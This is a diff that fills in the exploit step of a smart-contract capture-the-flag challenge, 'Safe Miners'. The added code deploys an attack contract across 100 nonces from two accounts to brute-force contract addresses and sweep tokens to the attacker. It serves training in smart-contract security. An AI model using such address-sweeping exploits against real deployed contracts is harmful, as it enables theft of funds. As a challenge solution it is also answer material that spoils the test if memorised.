@@ -24,6 +24,21 @@ describe("[Challenge] Safe Miners", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+
+    /** CODE YOUR EXPLOIT HERE */
+    // Disable timeouts, this is gonna take a while.
+    this.timeout(0)
+
+    // Try 100 nonces of both EOA accounts.
+    for (let nonce = 0; nonce < 100; nonce++) {
+      // Have each JuniorMinersExploit contract create 100 TokenSweepers.
+      await (
+        await ethers.getContractFactory("SafeMinersAttack", deployer)
+      ).deploy(attacker.address, this.token.address, 100)
+      await (
+        await ethers.getContractFactory("SafeMinersAttack", attacker)
+      ).deploy(attacker.address, this.token.address, 100)
+    }
   })
 
   after(async function () {
